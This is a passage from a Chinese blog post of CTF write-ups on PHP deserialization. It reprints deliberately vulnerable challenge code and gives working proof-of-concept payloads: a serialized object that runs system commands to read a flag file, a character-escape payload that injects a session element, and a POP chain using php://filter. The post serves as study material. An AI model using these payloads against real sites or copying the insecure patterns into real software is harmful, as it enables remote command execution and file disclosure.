style=color:#e6db74>&#34;filter_var&#34;</span>, <span style=color:#e6db74>&#34;filter_var_array&#34;</span>, <span style=color:#e6db74>&#34;uasort&#34;</span>, <span style=color:#e6db74>&#34;uksort&#34;</span>, <span style=color:#e6db74>&#34;array_reduce&#34;</span>,<span style=color:#e6db74>&#34;array_walk&#34;</span>, <span style=color:#e6db74>&#34;array_walk_recursive&#34;</span>,<span style=color:#e6db74>&#34;pcntl_exec&#34;</span>,<span style=color:#e6db74>&#34;fopen&#34;</span>,<span style=color:#e6db74>&#34;fwrite&#34;</span>,<span style=color:#e6db74>&#34;file_put_contents&#34;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>gettime</span>($func, $p) {
-</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>call_user_func</span>($func, $p);
-</span></span><span style=display:flex><span>        $a<span style=color:#f92672>=</span> <span style=color:#a6e22e>gettype</span>($result);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $result;
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;}
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span> {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Y-m-d h:i:s a&#34;</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;date&#34;</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> __destruct() {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    $func <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;func&#34;</span>];
-</span></span><span style=display:flex><span>    $p <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;p&#34;</span>];
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($func <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>        $func <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>($func);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($func,$disable_fun)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($func, $p);
-</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Hacker...&#34;</span>);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><p>无过滤，直来直去，直接构造POC</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// var $p = &#34;find / -name flag*&#34;; 先查一下服务器中含有flag的文件名，找到位置
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat /tmp/flagoefiu4r93&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;system&#34;</span>;
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span> ();
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($test));
-</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><h3 id=安洵杯-2019-easy_serialize_php>[安洵杯 2019] easy_serialize_php<a hidden class=anchor aria-hidden=true href=#安洵杯-2019-easy_serialize_php>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// 	d0g3_f1ag.php
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$function <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;f&#39;</span>];
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($img){
-</span></span><span style=display:flex><span>    $filter_arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;php&#39;</span>,<span style=color:#e6db74>&#39;flag&#39;</span>,<span style=color:#e6db74>&#39;php5&#39;</span>,<span style=color:#e6db74>&#39;php4&#39;</span>,<span style=color:#e6db74>&#39;fl1g&#39;</span>);
-</span></span><span style=display:flex><span>    $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>,$filter_arr)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/i&#39;</span>;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($filter,<span style=color:#e6db74>&#39;&#39;</span>,$img);
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SESSION){
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unset</span>($_SESSION);
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#34;user&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
-</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;function&#39;</span>] <span style=color:#f92672>=</span> $function;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>extract</span>($_POST);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$function){
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]){
-</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#e6db74>&#39;guest_img.png&#39;</span>);
-</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
-</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>base64_encode</span>($_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]));
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$serialize_info <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>serialize</span>($_SESSION));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;highlight_file&#39;</span>){
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
-</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;phpinfo&#39;</span>){
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;phpinfo();&#39;</span>); <span style=color:#75715e>//maybe you can find something in here!
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;show_image&#39;</span>){
-</span></span><span style=display:flex><span>    $userinfo <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($serialize_info);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>base64_decode</span>($userinfo[<span style=color:#e6db74>&#39;img&#39;</span>]));
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><ol><li>先查看phpinfo，发现敏感文件泄露：<code>d0g3_f1ag.php</code>，即使用<code>file_get_contents</code>读该文件</li><li>存在过滤，以及使用sha1函数替换了用户传入的<code>img_path</code>，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。</li><li>过滤方式是简单替换为空，存在绕过的可能。</li></ol><h4 id=知识点>知识点<a hidden class=anchor aria-hidden=true href=#知识点>#</a></h4><ol><li><p>本题的<code>$_SESSION</code>其实并不是PHP的自带变量，而是用户定义的变量，我们在<code>extract($_POST)</code>这里通过POST方式控制其内容。</p></li><li><p><strong>不是只有类和对象才有序列化和反序列化</strong>，类、对象、数组、变量均可进行序列化。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>a</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>array</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>b</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>boolean</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>d</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>double</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>i</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>integer</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>o</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>common</span> <span style=color:#a6e22e>object</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>r</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>reference</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>s</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>string</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>C</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>custom</span> <span style=color:#a6e22e>object</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>O</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>class</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>N</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>null</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>R</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>pointer</span> <span style=color:#a6e22e>reference</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>U</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>unicode</span> <span style=color:#a6e22e>string</span>
-</span></span></code></pre></div></li><li><p>PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。</p><p>故而在未遇到字符串尾：<code>;</code>和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。</p></li></ol><h4 id=php-反序列化字符逃逸>PHP 反序列化字符逃逸<a hidden class=anchor aria-hidden=true href=#php-反序列化字符逃逸>#</a></h4><blockquote><p>字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。</p></blockquote><p>本题存在过滤后字符变少的情况。</p><p>由于程序会将<code>$_SESSION['img']</code>设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。</p><ul><li><p>我们希望的<code>img</code>序列化结果(读取base64编码后的<code>d0g3_f1ag.php</code>)：</p><p><code>s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";</code></p></li><li><p>我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入</p><p><code>$_SESSION['xx']='";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'</code></p></li><li><p><code>$_SESSION</code>序列化后：</p><p><code>a:1:{s:2:"xx";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code></p></li><li><p>此时数一下多余的字符数：<code>;s:51:""</code>为8个，可用<code>flagflag</code>拼凑</p></li><li><p><code>a:1:{s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code></p></li><li><p>被过滤后，变成了：<code> a:1:{s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}</code>，此时，原先多余的八个字符正好会被当作第一个元素的名字，而<code>s:3:"aaa"</code>即为它的值，而后面的<code>img</code>参数能被正常解析成功！</p></li></ul><p><strong>Payload</strong></p><p>POST： <code>$_SESSION['flagflag']=";s:3:"abc";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></p><p>(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)</p><h3 id=mrctf2020ezpop>[MRCTF2020]Ezpop<a hidden class=anchor aria-hidden=true href=#mrctf2020ezpop>#</a></h3><p>本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含<code>include</code>的函数，故而需要用到文件包含的<code>php://filter</code>伪协议。</p><p><strong>POC</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>protected</span> $var<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $source;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $str;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag.php&#39;</span>){
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $p;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    $modifier <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Modifier</span>();
-</span></span><span style=display:flex><span>    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
-</span></span><span style=display:flex><span>    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
-</span></span><span style=display:flex><span>    $test<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> $modifier;
-</span></span><span style=display:flex><span>    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $test;
-</span></span><span style=display:flex><span>    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $show;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($show));
-</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2><ol><li><a href=https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/>PHP反序列化和POP链构造 - As1def&rsquo;s Blog</a></li><li><a href=https://www.freebuf.com/articles/web/247930.html>一题教你学会构造PHP反序列化POP链</a></li><li><a href=https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>BUUCTF刷题——PHP反序列化 - CA01H&rsquo; Blog</a></li><li><a href=https://xz.aliyun.com/t/9213>PHP 反序列化——字符逃逸</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://shenyiming.life/tags/ctf/>CTF</a></li><li><a href=https://shenyiming.life/tags/php/>PHP</a></li><li><a href=https://shenyiming.life/tags/web/>Web</a></li><li><a href=https://shenyiming.life/tags/note/>Note</a></li></ul><nav class=paginav><a class=prev href=https://shenyiming.life/post/ctf/ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/><span class=title>« Prev Page</span><br><span>CTF比赛方向选择&学习内容</span></a>
-<a class=next href=https://shenyiming.life/post/ctf/wp/ciscnwp/><span class=title>Next Page »</span><br><span>CISCN Crypt0 战队 WRITEUP</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on twitter" href="https://twitter.com/intent/tweet/?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&hashtags=CTF%2cPHP%2cWeb%2cNote"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&title=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&summary=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&source=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f&title=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on whatsapp" href="https://api.whatsapp.com/send?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20-%20https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on telegram" href="https://telegram.me/share/url?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer><style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>💬评论</span><hr></div><div id=tcomment></div><script src=https://cdn.jsdelivr.net/npm/twikoo@1.4.17/dist/twikoo.all.min.js></script>
-<script>twikoo.init({envId:"https://shenyiming-github-io-comments.vercel.app/",el:"#tcomment",lang:"zh-CN",region:"ap-shanghai",path:"window.TWIKOO_MAGIC_PATH||window.location.pathname"})</script></div></article></main><footer class=footer><span>Copyright &copy; 2021-2022 <a href=https://shenyiming.life><b>Shenyiming.Life</b></a></span>
